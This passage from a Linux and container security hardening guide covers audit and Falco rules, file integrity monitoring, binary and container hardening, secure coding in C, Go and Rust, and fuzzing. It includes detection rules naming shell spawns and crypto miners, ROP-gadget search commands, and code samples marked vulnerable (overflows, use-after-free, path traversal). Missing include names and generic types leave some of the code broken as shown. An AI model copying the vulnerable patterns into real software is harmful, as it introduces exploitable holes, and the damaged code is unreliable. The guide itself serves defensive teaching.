# ============================================================
-a always,exit -F arch=b64 -S connect -F a2=16 -k network_connect_4
-a always,exit -F arch=b64 -S connect -F a2=28 -k network_connect_6
-a always,exit -F arch=b64 -S accept4 -k network_accept

# ============================================================
# Monitor file creation in sensitive directories
# ============================================================
-a always,exit -F arch=b64 -S creat -S openat -F dir=/etc -F success=1 -k etc_writes
-a always,exit -F arch=b64 -S creat -S openat -F dir=/bin -F success=1 -k bin_writes
-a always,exit -F arch=b64 -S creat -S openat -F dir=/sbin -F success=1 -k sbin_writes
-a always,exit -F arch=b64 -S creat -S openat -F dir=/usr -F success=1 -k usr_writes

# ============================================================
# Make audit configuration immutable
# IMPORTANT: With -e 2, changes require reboot
# ============================================================
-e 2
```

### 16.2 Falco: Runtime Security Monitoring

Falco (CNCF project) uses eBPF/kernel modules to provide runtime security monitoring with a rule engine:

```yaml
# /etc/falco/rules.d/custom_rules.yaml

# Detect shell spawned from a container
- rule: Shell Spawned in Container
  desc: A shell was spawned in a container
  condition: >
    container.id != host AND
    proc.name in (shell_binaries) AND
    proc.pname in (container_entrypoints) AND
    not proc.pname in (shell_binaries)
  output: >
    Shell spawned in container (user=%user.name container_id=%container.id
    container_name=%container.name shell=%proc.name parent=%proc.pname
    cmdline=%proc.cmdline)
  priority: WARNING
  tags: [container, shell, mitre_execution]

# Detect write to /etc in container
- rule: Write to /etc Directory in Container
  desc: Detects writes to /etc in a container
  condition: >
    container.id != host AND
    evt.type in (open, openat, creat) AND
    evt.dir = < AND
    fd.name startswith /etc AND
    evt.is_open_write = true
  output: >
    Write to /etc in container (user=%user.name command=%proc.cmdline
    file=%fd.name container_id=%container.id)
  priority: ERROR
  tags: [container, file, mitre_persistence]

# Detect cryptocurrency mining
- rule: Crypto Mining Activity
  desc: Detects crypto mining process
  condition: >
    spawned_process AND
    (proc.cmdline contains "stratum+tcp" OR
     proc.cmdline contains "stratum+ssl" OR
     proc.name in (crypto_mining_binaries) OR
     (proc.name = xmrig) OR
     (proc.name = minerd))
  output: >
    Crypto mining detected (user=%user.name cmdline=%proc.cmdline
    container_id=%container.id)
  priority: CRITICAL
  tags: [host, cryptomining, mitre_impact]

# Detect privilege escalation
- rule: Setuid or Setgid Bit Set via chmod
  desc: Detects chmod with setuid/setgid
  condition: >
    evt.type = chmod AND
    evt.arg.mode contains "S_ISUID" OR evt.arg.mode contains "S_ISGID"
  output: >
    SETUID or SETGID bit set (user=%user.name fname=%evt.arg.filename
    mode=%evt.arg.mode command=%proc.cmdline)
  priority: ERROR
```

```bash
# Install Falco (modern eBPF driver, no kernel module needed)
falcoctl artifact install falco-rules

# Run Falco with eBPF
falco --driver modern_ebpf

# Watch alerts in real-time
journalctl -fu falco

# Forward to SIEM
# /etc/falco/falco.yaml:
# json_output: true
# json_include_output_property: true
# program_output:
#   enabled: true
#   keep_alive: false
#   program: "jq . | logger -t falco -p daemon.warning"
```

### 16.3 AIDE: File Integrity Monitoring

```bash
# Install and initialize AIDE database
aide --init
cp /var/lib/aide/aide.db.new /var/lib/aide/aide.db

# Check for changes
aide --check

# Update database after legitimate changes
aide --update

# /etc/aide.conf configuration:
cat > /etc/aide.conf.d/custom.conf << 'EOF'
# Define rule sets
NORMAL = p+i+u+g+s+m+sha256
READONLY = p+i+u+g+s+sha256+md5

# Monitor critical files with full verification
/etc        NORMAL
/bin        READONLY
/sbin       READONLY
/usr/bin    READONLY
/usr/sbin   READONLY
/boot       READONLY

# Ignore frequently changing files
!/var/log
!/var/run
!/var/cache
!/tmp
!/proc
!/sys
EOF
```

---

## 17. Supply Chain and Binary Security

### 17.1 Binary Analysis and Verification

```bash
# Comprehensive binary security check
checksec --file=/usr/bin/sshd --format=json

# Expected output for a hardened binary:
# {
#   "file": "/usr/bin/sshd",
#   "relro": "full",        ← Full RELRO
#   "canary": "yes",        ← Stack canary
#   "nx": "yes",            ← NX enabled
#   "pie": "yes",           ← PIE
#   "rpath": "no",          ← No RPATH (library injection risk)
#   "runpath": "no",        ← No RUNPATH
#   "symbols": "no",        ← Stripped symbols (harder to reverse)
#   "fortify_source": "yes", ← FORTIFY_SOURCE macros
#   "fortified": "4",
#   "fortify-able": "17"
# }

# FORTIFY_SOURCE: replaces unsafe libc functions with bounds-checking versions
# e.g., memcpy → __memcpy_chk, strcpy → __strcpy_chk
gcc -D_FORTIFY_SOURCE=3 -O2 -o hardened prog.c

# Examine shared library dependencies (potential injection points)
ldd /usr/bin/sshd
# Verify no unexpected libraries

# Check for RPATH (potential library hijacking)
objdump -x /usr/bin/sshd | grep -E 'RPATH|RUNPATH'
readelf -d /usr/bin/sshd | grep -E 'RPATH|RUNPATH'
```

### 17.2 ELF Security Analysis

```bash
# Examine ELF sections
readelf -S /usr/bin/sshd

# Critical sections:
# .text    = code (should be r-x)
# .data    = initialized data (should be rw-)
# .bss     = uninitialized data (rw-)
# .plt     = procedure linkage table (r-x)
# .got.plt = global offset table (rw- without Full RELRO, r-- with)
# .rodata  = read-only data (r--)

# Check if binary is stripped
file /usr/bin/sshd
# ELF 64-bit LSB pie executable, ... stripped

# Find gadgets for ROP analysis (offensive/defensive)
ROPgadget --binary /usr/bin/sshd | head -20

# Find syscall gadgets
ROPgadget --binary /usr/bin/sshd | grep "syscall"
```

### 17.3 Compiler Hardening Flags

```makefile
# Production-grade compiler flags for C/C++

SECURITY_CFLAGS := \
    -D_FORTIFY_SOURCE=3              \  # Buffer overflow detection
    -fstack-protector-strong          \  # Stack canaries
    -fstack-clash-protection          \  # Stack clash mitigation
    -fcf-protection=full              \  # Intel CET (IBT + Shadow Stack)
    -fpie                             \  # Position independent (for PIE)
    -fno-strict-overflow              \  # Don't optimize based on UB overflow
    -fno-delete-null-pointer-checks   \  # Keep null checks (prevent UB elision)
    -fwrapv                           \  # Wrap on signed overflow (defined behavior)
    -Wformat -Wformat-security        \  # Format string warnings
    -Werror=format-security           \  # Treat as errors

SECURITY_LDFLAGS := \
    -pie                              \  # PIE binary
    -Wl,-z,relro                      \  # Partial RELRO
    -Wl,-z,now                        \  # Full RELRO (resolve all at startup)
    -Wl,-z,noexecstack                \  # Non-executable stack
    -Wl,-z,separate-code             \  # Separate text and data
    -Wl,--as-needed                   \  # Only link needed libraries

all: prog

prog: prog.c
    $(CC) $(SECURITY_CFLAGS) $(SECURITY_LDFLAGS) -o $@ $<
```

### 17.4 Software Bill of Materials (SBOM) and Supply Chain

```bash
# Generate SBOM with syft
syft scan /usr/bin/myapp -o spdx-json > myapp.spdx.json
syft scan . -o cyclonedx-json > app.cyclonedx.json

# Scan for known vulnerabilities
grype sbom:myapp.spdx.json

# Sign binaries with sigstore (cosign)
cosign sign-blob --key cosign.key ./myapp > myapp.sig
cosign verify-blob --key cosign.pub --signature myapp.sig ./myapp

# Sign container images
cosign sign --key cosign.key myregistry/myapp:latest
cosign verify --key cosign.pub myregistry/myapp:latest

# SLSA provenance (supply chain integrity)
# In GitHub Actions with SLSA generator:
# generates provenance.intoto.jsonl automatically
slsa-verifier verify-artifact myapp \
    --provenance-path provenance.intoto.jsonl \
    --source-uri github.com/myorg/myapp
```

---

## 18. Container Security Internals

### 18.1 OCI Runtime Security

The OCI (Open Container Initiative) runtime spec defines the container execution environment. `runc` is the reference implementation; `crun` is a C implementation; `gVisor` uses a different approach.

```json
// config.json (OCI Runtime Spec) - security-relevant fields
{
  "ociVersion": "1.0.2",
  "process": {
    "user": {
      "uid": 1000,
      "gid": 1000,
      "additionalGids": []
    },
    "capabilities": {
      "bounding":  ["CAP_NET_BIND_SERVICE"],
      "effective": ["CAP_NET_BIND_SERVICE"],
      "permitted": ["CAP_NET_BIND_SERVICE"],
      "inheritable": [],
      "ambient": []
    },
    "noNewPrivileges": true,
    "oomScoreAdj": 500,
    "selinuxLabel": "system_u:system_r:container_t:s0:c123,c456",
    "apparmorProfile": "docker-default"
  },
  "linux": {
    "namespaces": [
      {"type": "pid"},
      {"type": "network"},
      {"type": "ipc"},
      {"type": "uts"},
      {"type": "mount"},
      {"type": "user"}
    ],
    "uidMappings": [
      {"containerID": 0, "hostID": 100000, "size": 65536}
    ],
    "gidMappings": [
      {"containerID": 0, "hostID": 100000, "size": 65536}
    ],
    "seccomp": {
      "defaultAction": "SCMP_ACT_ERRNO",
      "architectures": ["SCMP_ARCH_X86_64"],
      "syscalls": [
        {
          "names": ["read", "write", "close", "exit_group", "futex",
                    "mmap", "munmap", "brk", "accept4", "sendto",
                    "recvfrom", "epoll_wait", "epoll_ctl", "openat",
                    "fstat", "clock_gettime"],
          "action": "SCMP_ACT_ALLOW"
        }
      ]
    },
    "maskedPaths": [
      "/proc/acpi",
      "/proc/asound",
      "/proc/kcore",
      "/proc/keys",
      "/proc/latency_stats",
      "/proc/timer_list",
      "/proc/timer_stats",
      "/proc/sched_debug",
      "/proc/scsi",
      "/sys/firmware"
    ],
    "readonlyPaths": [
      "/proc/bus",
      "/proc/fs",
      "/proc/irq",
      "/proc/sys",
      "/proc/sysrq-trigger"
    ],
    "resources": {
      "memory": {
        "limit": 268435456,
        "reservation": 67108864,
        "swap": 268435456
      },
      "cpu": {
        "quota": 100000,
        "period": 200000
      },
      "pids": {
        "limit": 100
      }
    }
  }
}
```

### 18.2 Docker Security Hardening

```bash
# Run container with security hardening
docker run \
  --security-opt no-new-privileges:true \
  --security-opt apparmor=docker-default \
  --security-opt seccomp=my-seccomp-profile.json \
  --cap-drop ALL \
  --cap-add NET_BIND_SERVICE \
  --read-only \
  --tmpfs /tmp:rw,noexec,nosuid,size=100m \
  --tmpfs /var/run:rw,noexec,nosuid \
  --user 1000:1000 \
  --pids-limit 100 \
  --memory 256m \
  --memory-swap 256m \
  --cpu-quota 100000 \
  --ulimit nofile=1024:1024 \
  --network my-isolated-network \
  myimage:latest
```

**Docker daemon hardening (`/etc/docker/daemon.json`):**

```json
{
  "icc": false,
  "no-new-privileges": true,
  "default-ulimits": {
    "nofile": {
      "Name": "nofile",
      "Hard": 65536,
      "Soft": 1024
    }
  },
  "selinux-enabled": true,
  "userns-remap": "default",
  "live-restore": true,
  "userland-proxy": false,
  "log-driver": "json-file",
  "log-opts": {
    "max-size": "10m",
    "max-file": "3"
  },
  "storage-driver": "overlay2",
  "default-runtime": "runc",
  "seccomp-profile": "/etc/docker/seccomp-custom.json"
}
```

### 18.3 Kubernetes Pod Security

```yaml
# Pod Security Standards (PSS) - Restricted profile
# /etc/kubernetes/policies/restricted-podsecuritypolicy.yaml
apiVersion: v1
kind: Pod
metadata:
  name: secure-pod
  namespace: production
  annotations:
    seccomp.security.alpha.kubernetes.io/pod: runtime/default
spec:
  securityContext:
    runAsNonRoot: true
    runAsUser: 1000
    runAsGroup: 3000
    fsGroup: 2000
    seccompProfile:
      type: RuntimeDefault
    supplementalGroups: [4000]

  containers:
  - name: app
    image: myapp:latest@sha256:abc123...  # Pin to digest, not tag
    
    securityContext:
      allowPrivilegeEscalation: false
      capabilities:
        drop: ["ALL"]
        add: ["NET_BIND_SERVICE"]
      readOnlyRootFilesystem: true
      runAsNonRoot: true
      runAsUser: 1000
      seccompProfile:
        type: RuntimeDefault
    
    resources:
      requests:
        memory: "64Mi"
        cpu: "250m"
      limits:
        memory: "128Mi"
        cpu: "500m"
    
    volumeMounts:
    - name: tmp-volume
      mountPath: /tmp
    - name: config-volume
      mountPath: /etc/myapp
      readOnly: true
    
    # Liveness and readiness: fail fast on compromise
    livenessProbe:
      httpGet:
        path: /healthz
        port: 8080
      failureThreshold: 3
      periodSeconds: 10
    
  volumes:
  - name: tmp-volume
    emptyDir:
      medium: Memory  # tmpfs - faster + no disk persistence
      sizeLimit: 64Mi
  - name: config-volume
    configMap:
      name: myapp-config
      defaultMode: 0440  # Read-only for owner and group
```

### 18.4 gVisor: Kernel Isolation for Containers

gVisor implements a user-space kernel (Sentry) that intercepts all syscalls from the container. The container's system calls never reach the host kernel directly.

```
gVisor Architecture:
====================

Container Process
      |
      | syscall (e.g., read)
      v
  gVisor Sentry (user-space kernel written in Go)
  - Implements Linux syscall interface
  - Translated to safe operations
  - sandboxed from host kernel
      |
      v (only a small set of host syscalls needed)
  Host Kernel
  - Much smaller attack surface
  - Container can't exploit most host kernel bugs
```

```bash
# Install gVisor (runsc)
curl -fsSL https://gvisor.dev/archive.key | gpg --dearmor -o /usr/share/keyrings/gvisor-archive-keyring.gpg
echo "deb [arch=$(dpkg --print-architecture) signed-by=/usr/share/keyrings/gvisor-archive-keyring.gpg] https://storage.googleapis.com/gvisor/releases release main" | tee /etc/apt/sources.list.d/gvisor.list
apt-get update && apt-get install -y runsc

# Configure Docker to use gVisor
cat > /etc/docker/daemon.json << 'EOF'
{
  "runtimes": {
    "runsc": {
      "path": "/usr/bin/runsc"
    }
  }
}
EOF
systemctl restart docker

# Run container with gVisor
docker run --runtime=runsc -it ubuntu bash

# Kubernetes: use RuntimeClass
kubectl apply -f - << 'EOF'
apiVersion: node.k8s.io/v1
kind: RuntimeClass
metadata:
  name: gvisor
handler: runsc
EOF

# Pod using gVisor
apiVersion: v1
kind: Pod
metadata:
  name: gvisor-pod
spec:
  runtimeClassName: gvisor
  containers:
  - name: app
    image: myapp:latest
```

---

## 19. Secure Coding: C, Go, Rust - Vulnerabilities and Mitigations

### 19.1 Memory Safety: C vs Go vs Rust

**The fundamental problem with C:**

C gives the programmer direct memory access with no safety guarantees. The compiler trusts the programmer completely. Every pointer dereference, buffer access, and memory allocation is a potential vulnerability.

```c
/* C VULNERABILITY CATALOG */

/* 1. Buffer overflow */
char buf[10];
memcpy(buf, input, input_len);  // input_len may be > 10

/* 2. Use-after-free */
char *p = malloc(100);
free(p);
*p = 'x';  // p is dangling pointer

/* 3. Double free */
free(p);
free(p);  // Undefined behavior → heap corruption

/* 4. Integer overflow → memory corruption */
int size = count * sizeof(item);
// If count = INT_MAX/4 + 1: overflow → negative size → malloc(negative)

/* 5. Null pointer dereference */
struct foo *p = get_foo();  // May return NULL
p->field = 1;  // Crash or worse if NULL

/* 6. Type confusion */
union {
    int i;
    float f;
} u;
u.i = user_controlled;
float result = u.f * 2.0;  // Using int bits as float → undefined behavior

/* 7. Uninitialized memory */
char secret[32];
// (initialized with sensitive data, then cleared)
char buf[32];  // Not initialized
if (memcmp(buf, secret, 32) == 0)  // Comparing uninitialized data
```

**SECURE C patterns:**

```c
#include 
#include 
#include 
#include 
#include 
#include 

/* 1. Safe buffer operations */
typedef struct {
    uint8_t *data;
    size_t  len;
    size_t  cap;
} SafeBuffer;

SafeBuffer *safe_buffer_create(size_t initial_cap) {
    if (initial_cap == 0 || initial_cap > 64 * 1024 * 1024) {  /* 64MB max */
        errno = EINVAL;
        return NULL;
    }

    SafeBuffer *sb = calloc(1, sizeof(SafeBuffer));
    if (!sb) return NULL;

    sb->data = calloc(initial_cap, 1);  /* calloc zeros memory */
    if (!sb->data) {
        free(sb);
        return NULL;
    }
    sb->cap = initial_cap;
    sb->len = 0;
    return sb;
}

int safe_buffer_append(SafeBuffer *sb, const uint8_t *data, size_t len) {
    if (!sb || !data) return -EINVAL;
    
    /* Check if we need to grow */
    if (len > sb->cap - sb->len) {
        /* Check for overflow in new capacity calculation */
        size_t new_cap = sb->cap;
        while (new_cap < sb->len + len) {
            if (new_cap > SIZE_MAX / 2) return -EOVERFLOW;
            new_cap *= 2;
        }
        
        /* Realloc safely */
        uint8_t *new_data = realloc(sb->data, new_cap);
        if (!new_data) return -ENOMEM;
        
        /* Zero newly allocated portion */
        memset(new_data + sb->cap, 0, new_cap - sb->cap);
        sb->data = new_data;
        sb->cap  = new_cap;
    }
    
    memcpy(sb->data + sb->len, data, len);
    sb->len += len;
    return 0;
}

void safe_buffer_destroy(SafeBuffer **sb) {
    if (sb && *sb) {
        if ((*sb)->data) {
            explicit_bzero((*sb)->data, (*sb)->cap);  /* Clear sensitive data */
            free((*sb)->data);
        }
        free(*sb);
        *sb = NULL;
    }
}

/* 2. Safe integer arithmetic */
static inline int checked_add_size(size_t a, size_t b, size_t *result) {
    if (b > SIZE_MAX - a) return -EOVERFLOW;
    *result = a + b;
    return 0;
}

static inline int checked_mul_size(size_t a, size_t b, size_t *result) {
    if (a != 0 && b > SIZE_MAX / a) return -EOVERFLOW;
    *result = a * b;
    return 0;
}

/* 3. Secure string handling */
char *safe_strdup(const char *src, size_t max_len) {
    if (!src) return NULL;
    size_t len = strnlen(src, max_len);
    if (len == max_len) {
        errno = ENAMETOOLONG;
        return NULL;
    }
    char *dup = malloc(len + 1);
    if (!dup) return NULL;
    memcpy(dup, src, len);
    dup[len] = '\0';
    return dup;
}

/* 4. Error propagation without goto confusion */
typedef struct {
    int fd;
    char *buffer;
    size_t buffer_size;
} FileContext;

FileContext *open_secure(const char *path, size_t buf_size) {
    FileContext *ctx = NULL;
    
    /* Validate inputs */
    if (!path || buf_size == 0 || buf_size > 100 * 1024 * 1024) {
        errno = EINVAL;
        return NULL;
    }
    
    ctx = calloc(1, sizeof(FileContext));
    if (!ctx) goto err_ctx;
    
    ctx->buffer = malloc(buf_size);
    if (!ctx->buffer) goto err_buffer;
    
    ctx->fd = open(path, O_RDONLY | O_CLOEXEC);
    if (ctx->fd < 0) goto err_fd;
    
    ctx->buffer_size = buf_size;
    return ctx;

/* Cleanup labels: only resources that have been successfully acquired */
err_fd:
    free(ctx->buffer);
err_buffer:
    free(ctx);
err_ctx:
    return NULL;
}

void close_secure(FileContext **ctx) {
    if (ctx && *ctx) {
        if ((*ctx)->fd >= 0) close((*ctx)->fd);
        if ((*ctx)->buffer) {
            explicit_bzero((*ctx)->buffer, (*ctx)->buffer_size);
            free((*ctx)->buffer);
        }
        free(*ctx);
        *ctx = NULL;
    }
}
```

### 19.2 Memory Safety in Go

Go eliminates many C vulnerabilities through garbage collection, bounds checking, and type safety. However, Go has its own security considerations.

```go
package secure

import (
	"crypto/subtle"
	"errors"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"sync"
	"unicode/utf8"
)

// ==================== Go-specific Security Issues ====================

// ISSUE 1: Goroutine race conditions → data corruption
// VULNERABLE:
type VulnerableCounter struct {
	count int  // Not thread-safe
}

func (c *VulnerableCounter) Increment() {
	c.count++  // Data race: multiple goroutines can corrupt this
}

// SECURE:
type SecureCounter struct {
	mu    sync.Mutex
	count int64
}

func (c *SecureCounter) Increment() {
	c.mu.Lock()
	defer c.mu.Unlock()
	c.count++
}

// Even better: use atomic operations for simple counters
import "sync/atomic"
type AtomicCounter struct {
	count int64
}
func (c *AtomicCounter) Increment() {
	atomic.AddInt64(&c.count, 1)
}

// ISSUE 2: Slice header confusion
// VULNERABLE: sharing underlying array
func VulnerableSlice(data []byte) []byte {
	return data[:10]  // Shares underlying array with data!
	// Modifying the return value modifies data
}

// SECURE: copy to new backing array
func SecureSlice(data []byte, maxLen int) ([]byte, error) {
	if len(data) < maxLen {
		return nil, fmt.Errorf("data too short: need %d, have %d", maxLen, len(data))
	}
	result := make([]byte, maxLen)
	copy(result, data[:maxLen])
	return result, nil
}

// ISSUE 3: Path traversal
// VULNERABLE:
func VulnerableReadFile(baseDir, filename string) ([]byte, error) {
	path := baseDir + "/" + filename
	return os.ReadFile(path)  // filename = "../../etc/shadow" → traversal!
}

// SECURE: canonical path validation
func SecureReadFile(baseDir, filename string) ([]byte, error) {
	// Resolve to canonical paths
	base, err := filepath.Abs(baseDir)
	if err != nil {
		return nil, fmt.Errorf("resolve base: %w", err)
	}
	
	// Clean the filename and join
	clean := filepath.Clean(filepath.Join(base, filename))
	
	// Verify the result is within base directory
	if !strings.HasPrefix(clean, base+string(filepath.Separator)) &&
	   clean != base {
		return nil, errors.New("path traversal detected")
	}
	
	// Additional: check the file is actually a regular file
	info, err := os.Lstat(clean)
	if err != nil {
		return nil, fmt.Errorf("stat file: %w", err)
	}
	if !info.Mode().IsRegular() {
		return nil, errors.New("not a regular file")
	}
	
	return os.ReadFile(clean)
}

// ISSUE 4: Timing attacks in comparison
// VULNERABLE: variable-time comparison
func VulnerableCompare(a, b string) bool {
	return a == b  // Returns early on first mismatch → timing oracle
}

// SECURE: constant-time comparison
func SecureCompare(a, b []byte) bool {
	return subtle.ConstantTimeCompare(a, b) == 1
}

// ISSUE 5: Sensitive data in error messages
// VULNERABLE:
func VulnerableAuth(password, expected string) error {
	if password != expected {
		return fmt.Errorf("password '%s' does not match expected '%s'", 
		                   password, expected)  // Leaks both passwords!
	}
	return nil
}

// SECURE:
var ErrAuthFailed = errors.New("authentication failed")

func SecureAuth(password, expected []byte) error {
	if subtle.ConstantTimeCompare(password, expected) != 1 {
		return ErrAuthFailed  // No details about what failed
	}
	return nil
}

// ISSUE 6: Input validation
var (
	// Pre-compiled regex is faster and avoids re-compilation vulnerability
	validUsername = regexp.MustCompile(`^[a-zA-Z][a-zA-Z0-9_-]{0,31}$`)
	validEmail    = regexp.MustCompile(`^[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}$`)
)

func ValidateUsername(username string) error {
	if !utf8.ValidString(username) {
		return errors.New("username contains invalid UTF-8")
	}
	if !validUsername.MatchString(username) {
		return errors.New("invalid username format")
	}
	return nil
}

// ISSUE 7: Resource exhaustion from unbounded reads
func SecureReadLimited(r io.Reader, maxBytes int64) ([]byte, error) {
	// LimitReader prevents reading more than maxBytes
	limited := io.LimitReader(r, maxBytes+1)
	data, err := io.ReadAll(limited)
	if err != nil {
		return nil, err
	}
	if int64(len(data)) > maxBytes {
		return nil, fmt.Errorf("data exceeds maximum size of %d bytes", maxBytes)
	}
	return data, nil
}
```

### 19.3 Memory Safety in Rust

Rust's ownership system provides compile-time memory safety guarantees. Most C vulnerability classes are impossible in safe Rust.

```rust
use std::collections::HashMap;
use std::fs;
use std::io::{self, Read};
use std::path::{Path, PathBuf};
use std::sync::{Arc, Mutex, RwLock};

// ==================== Rust Safety Properties ====================

// PROPERTY 1: No use-after-free — ownership ensures this
fn no_use_after_free() {
    let data = vec![1u8, 2, 3];
    drop(data);
    // data[0];  // Compile error: value borrowed after move
}

// PROPERTY 2: No null pointer dereference — Option instead of NULL
fn safe_option(maybe_value: Option) -> &str {
    match maybe_value {
        Some(val) => val,
        None => "default",  // Must handle None case
    }
    // Rust forces you to check
}

// PROPERTY 3: No buffer overflow — bounds checking at runtime
fn safe_indexing(data: &[u8], index: usize) -> Option {
    data.get(index).copied()  // Returns None instead of panic/OOB
    // Direct indexing data[index] would panic on OOB (not UB like C)
}

// PROPERTY 4: Thread safety enforced at compile time
// Arc<Mutex>: shared ownership + mutual exclusion
struct SharedState {
    counter: Arc<Mutex>,
    data: Arc<RwLock<HashMap>>>,
}

impl SharedState {
    fn new() -> Self {
        SharedState {
            counter: Arc::new(Mutex::new(0)),
            data: Arc::new(RwLock::new(HashMap::new())),
        }
    }

    fn increment(&self) -> Result> {
        let mut guard = self.counter.lock().map_err(|e| e.to_string())?;
        *guard += 1;
        Ok(*guard)
    }

    fn insert(&self, key: String, value: Vec) -> Result> {
        let mut guard = self.data.write().map_err(|e| e.to_string())?;
        guard.insert(key, value);
        Ok(())
    }
}

// PROPERTY 5: Integer overflow → panic in debug, wrap in release
// Use checked arithmetic for security-critical code:
fn safe_allocation_size(count: usize, item_size: usize) -> Option {
    count.checked_mul(item_size)
         .and_then(|n| n.checked_add(1))
}

// ==================== Secure Patterns in Rust ====================

// Path traversal prevention
pub fn secure_read_file(base: &Path, filename: &str) -> io::Result<Vec> {
    // Canonicalize base directory (resolves symlinks)
    let base = base.canonicalize()?;
    
    // Join and canonicalize the full path
    let target = base.join(filename);
    
    // For canonicalize to work, the file must exist
    // Use a safer approach: check before canonicalize
    let parent = target.parent()
        .ok_or_else(|| io::Error::new(io::ErrorKind::InvalidInput, "no parent"))?;
    let parent = parent.canonicalize()
        .map_err(|_| io::Error::new(io::ErrorKind::NotFound, "parent not found"))?;
    
    // Verify the parent is within the base
    if !parent.starts_with(&base) {
        return Err(io::Error::new(
            io::ErrorKind::PermissionDenied,
            "path traversal detected",
        ));
    }
    
    // Verify it's a regular file
    let metadata = fs::metadata(&target)?;
    if !metadata.is_file() {
        return Err(io::Error::new(
            io::ErrorKind::InvalidInput,
            "not a regular file",
        ));
    }
    
    // Limit file size to prevent DoS
    const MAX_FILE_SIZE: u64 = 10 * 1024 * 1024;  // 10MB
    if metadata.len() > MAX_FILE_SIZE {
        return Err(io::Error::new(
            io::ErrorKind::InvalidInput,
            "file too large",
        ));
    }
    
    fs::read(target)
}

// Timing-safe comparison
pub fn constant_time_eq(a: &[u8], b: &[u8]) -> bool {
    // Note: also check length in constant time to prevent length oracle
    if a.len() != b.len() {
        // Still compare to prevent timing differences from length check
        // (an attacker could determine length by timing)
        let _ = a.iter().zip(b.iter()).fold(0u8, |acc, (x, y)| acc | (x ^ y));
        return false;
    }
    let result = a.iter().zip(b.iter()).fold(0u8, |acc, (x, y)| acc | (x ^ y));
    result == 0
}

// Zeroize sensitive data on drop (using the zeroize crate pattern)
pub struct SecretKey {
    bytes: Vec,
}

impl SecretKey {
    pub fn new(bytes: Vec) -> Self {
        SecretKey { bytes }
    }
    
    pub fn as_bytes(&self) -> &[u8] {
        &self.bytes
    }
}

impl Drop for SecretKey {
    fn drop(&mut self) {
        // Zeroize the key material before deallocation
        // In production: use the 'zeroize' crate for this
        for byte in &mut self.bytes {
            unsafe {
                std::ptr::write_volatile(byte, 0);
            }
        }
    }
}

// Resource limit for I/O
pub fn read_limited(reader: &mut R, max_bytes: usize) -> io::Result<Vec> {
    let mut buffer = Vec::with_capacity(min(max_bytes, 8192));
    let mut total_read = 0usize;
    let mut chunk = [0u8; 4096];
    
    loop {
        let n = reader.read(&mut chunk)?;
        if n == 0 {
            break;  // EOF
        }
        
        total_read = total_read.checked_add(n)
            .ok_or_else(|| io::Error::new(io::ErrorKind::InvalidData, "size overflow"))?;
        
        if total_read > max_bytes {
            return Err(io::Error::new(
                io::ErrorKind::InvalidData,
                format!("data exceeds limit of {} bytes", max_bytes),
            ));
        }
        
        buffer.extend_from_slice(&chunk[..n]);
    }
    
    Ok(buffer)
}

fn min(a: usize, b: usize) -> usize {
    if a < b { a } else { b }
}
```

### 19.4 Unsafe Rust: When and How

Some operations in Rust require `unsafe` blocks. These must be handled with extreme care — they're the islands of potential unsafety in an otherwise safe sea.

```rust
// UNSAFE RUST: when unavoidable (FFI, performance-critical code)

use std::slice;

// Safe abstraction over unsafe code
// Invariant: caller must ensure:
//   1. ptr is valid and non-null
//   2. data at ptr is valid for len bytes  
//   3. data won't be modified through another reference while this exists
//   4. len doesn't exceed actual allocation
pub unsafe fn raw_bytes_to_slice(ptr: *const u8, len: usize) -> Option {
    if ptr.is_null() {
        return None;
    }
    if len == 0 {
        return Some(&[]);
    }
    // SAFETY: caller has verified ptr is valid for len bytes
    Some(unsafe { slice::from_raw_parts(ptr, len) })
}

// FFI wrapper: C function that returns owned buffer
extern "C" {
    fn c_get_data(out_len: *mut usize) -> *mut u8;
    fn c_free_data(ptr: *mut u8);
}

// RAII wrapper to ensure C memory is freed
pub struct CBuffer {
    ptr: *mut u8,
    len: usize,
}

impl CBuffer {
    pub fn new() -> Option {
        let mut len: usize = 0;
        // SAFETY: c_get_data returns valid ptr of 'len' bytes or NULL
        let ptr = unsafe { c_get_data(&mut len) };
        if ptr.is_null() {
            return None;
        }
        Some(CBuffer { ptr, len })
    }
    
    pub fn as_slice(&self) -> &[u8] {
        if self.ptr.is_null() || self.len == 0 {
            return &[];
        }
        // SAFETY: ptr is valid for self.len bytes, won't be freed until drop
        unsafe { slice::from_raw_parts(self.ptr, self.len) }
    }
}

impl Drop for CBuffer {
    fn drop(&mut self) {
        if !self.ptr.is_null() {
            // SAFETY: ptr was returned by c_get_data and not yet freed
            unsafe { c_free_data(self.ptr) };
            self.ptr = std::ptr::null_mut();
        }
    }
}

// Unsafe invariant documentation pattern
/// # Safety
///
/// This function is safe to call when:
/// - `fd` is a valid open file descriptor
/// - `fd` will not be closed by another thread during this call
/// - The calling process has read permission on `fd`
pub unsafe fn read_exact_fd(fd: i32, buf: &mut [u8]) -> io::Result {
    use std::os::unix::io::RawFd;
    // ... implementation ...
    Ok(())
}
```

---

## 20. Fuzzing and Vulnerability Discovery

### 20.1 Fuzzing Fundamentals

Fuzzing (fuzz testing) is the technique of providing malformed, random, or unexpected inputs to a program to trigger crashes, assertion failures, or undefined behavior.

**Fuzzing types:**

| Type | Description | When to use |
|------|-------------|-------------|
| **Black-box** | No source code access, treats program as black box | Third-party binaries |
| **Grey-box** | Coverage-guided: instruments binary to measure code coverage | Most modern fuzzers (AFL++) |
| **White-box** | Full source access, symbolic execution | Complex logic bugs |
| **In-process** | Runs fuzzing in same process (libFuzzer) | Libraries, parsers |
| **Out-of-process** | Separate process per test (AFL++) | Full applications |

### 20.2 libFuzzer (In-Process Fuzzing)

libFuzzer runs the fuzzer in the same process as the target. It uses coverage feedback (SanCov instrumentation) to guide mutation.

**Fuzzing a C parser:**

```c
/* parser_fuzz.c: fuzz target for a custom parser */
#include 
#include 
#include 

/* Function under test */
int parse_packet(const uint8_t *data, size_t len);

/* libFuzzer entry point - called repeatedly with mutated inputs */
int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) {
    /* Bounds: reject trivially invalid inputs */
    if (size > 65536) return 0;
    
    /* Call the function under test */
    parse_packet(data, size);
    
    /* libFuzzer detects: crashes (SIGSEGV/SIGABRT), 
       sanitizer violations (ASan/UBSan/MSan), 
       assertion failures */
    return 0;
}

/* Build: */
/* clang -g -O1 -fsanitize=fuzzer,address,undefined parser_fuzz.c parser.c -o parser_fuzz */

/* Run: */
/* ./parser_fuzz corpus/ -max_len=65536 -jobs=8 -timeout=10 */
```

**Fuzzing a Go parser:**

```go
